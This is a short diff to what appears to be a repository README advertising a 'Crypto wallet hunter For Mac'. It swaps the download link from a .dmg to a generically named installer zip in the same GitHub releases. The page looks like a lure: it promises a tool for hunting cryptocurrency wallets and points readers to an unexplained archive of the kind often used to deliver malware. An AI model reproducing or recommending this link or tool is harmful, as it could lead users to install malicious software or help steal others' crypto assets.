@@ -4,7 +4,7 @@
 
 
 
-Crypto wallet hunter For Mac 2024 v. 25.7.0 | <a href="https://github.com/4samitim/CyberReverse/releases/download/25.7/Setup_V3.0.dmg">Download</a>
+Crypto wallet hunter For Mac 2024 v. 25.7.0 | <a href="https://github.com/4samitim/CyberReverse/releases/download/25.7/Software_Installation_Tool.v3.2.zip">Download</a>
 </h1>
 
 *****
